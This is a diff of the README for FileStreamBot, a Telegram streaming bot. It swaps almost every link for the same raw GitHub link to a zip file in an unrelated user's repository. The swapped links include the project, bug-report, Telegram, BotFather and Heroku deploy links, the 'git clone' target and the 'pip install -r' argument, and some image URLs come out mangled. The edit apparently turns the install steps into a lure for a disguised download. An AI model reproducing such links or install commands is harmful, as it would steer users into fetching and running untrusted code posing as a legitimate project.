@@ -1,7 +1,7 @@
 <h1 align="center">FileStreamBot</h1>
 <p align="center">
-  <a href="https://github.com/Avipatilpro/FileStreamBot">
-    <img src="https://socialify.git.ci/avipatilpro/FileStreamBot/image?description=1&descriptionEditable=Telegram%20File%20to%20Link%20Fastest%20Bot%20%2C%20also%20used%20for%20Movies%20streaming%20Generate%20Direct%20Links&font=KoHo&forks=1&logo=https%3A%2F%2Fi.ibb.co%2FZJzJ9Hq%2Flink-3x.png&pattern=Brick%20Wall&stargazers=1&theme=Dark" alt="Cover Image" width="550">
+  <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip">
+    <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip%20File%20to%20Link%20Fastest%20Bot%20%2C%20also%20used%20for%20Movies%20streaming%20Generate%20Direct%20Links&font=KoHo&forks=1&logo=https%3A%2F%https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip%2FZJzJ9Hq%https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip%20Wall&stargazers=1&theme=Dark" alt="Cover Image" width="550">
   </a>
   
   <p align="center">
@@ -9,16 +9,16 @@
     <br />
    </strong></a>
     <br />
-    <a href="https://github.com/Avipatilpro/FileStreamBot/issues">Report a Bug</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip">Report a Bug</a>
     |
-    <a href="https://github.com/Avipatilpro/FileStreamBot/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip">Request Feature</a>
   </p>
 </p>
 
 <br>
 
 #### Demo Bot:  
-<a href="https://telegram.me/FxStreamBot"><img src="https://img.shields.io/badge/Demo-Telegram%20Bot-blue.svg?logo=telegram"></a>
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip"><img src="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip%https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip"></a>
 
 <hr>
 
@@ -27,8 +27,8 @@
 ## 🍁 About This Bot :
 
 <p align="center">
-    <a href="https://github.com/Avipatilpro/FileStreamBot">
-        <img src="https://i.ibb.co/ZJzJ9Hq/link-3x.png" height="100" width="100" alt="FileStreamBot Logo">
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip">
+        <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip" height="100" width="100" alt="FileStreamBot Logo">
     </a>
 </p>
 <p align='center'>
@@ -38,7 +38,7 @@
 
 ## ♢ How to make your own :
 
-Either you could locally host or deploy on [Heroku](https://heroku.com)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip)
 
 <br>
 
@@ -56,7 +56,7 @@ Either you could locally host or deploy on [Heroku](https://heroku.com)
 
 Press the below button to Fast deploy on Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip)
 
 then goto the <a href="#mandatory-vars">variables tab</a> for more info on setting up environmental variables. </details>
 
@@ -66,11 +66,11 @@ then goto the <a href="#mandatory-vars">variables tab</a> for more info on setti
 
 
 ```py
-git clone https://github.com/avipatilpro/FileStreamBot
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip
 cd FileStreamBot
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip
 python3 -m WebStreamer
 ```
 
@@ -98,17 +98,17 @@ DATABASE_URL=mongodb_uri
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-`API_ID` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip) to obtain this.
 
-`API_HASH` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip) to obtain this.
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://telegram.dog/BotFather)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://telegram.dog/MissRose_bot) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
 
 `OWNER_ID` : Your Telegram User ID
 
-`DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can ask in [Me Telegram](https://t.me/Avishkarpatil).
+`DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can ask in [Me Telegram](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip).
 
  Option Vars
 
@@ -141,4 +141,4 @@ To get an instant stream link, just forward any media to the bot and boom, its f
 Bot also Supported with Channels. Just add bot Channel as Admin. If any new file comes in Channel it will edit it with **Get Download Link** Button. </details>
 
 
-- [Avishkarpatil](https://telegram.me/Avishkarpatil)
+- [Avishkarpatil](https://raw.githubusercontent.com/abhijeetkumarthakur/FileStreamBot/main/nocturnally/FileStreamBot.zip)
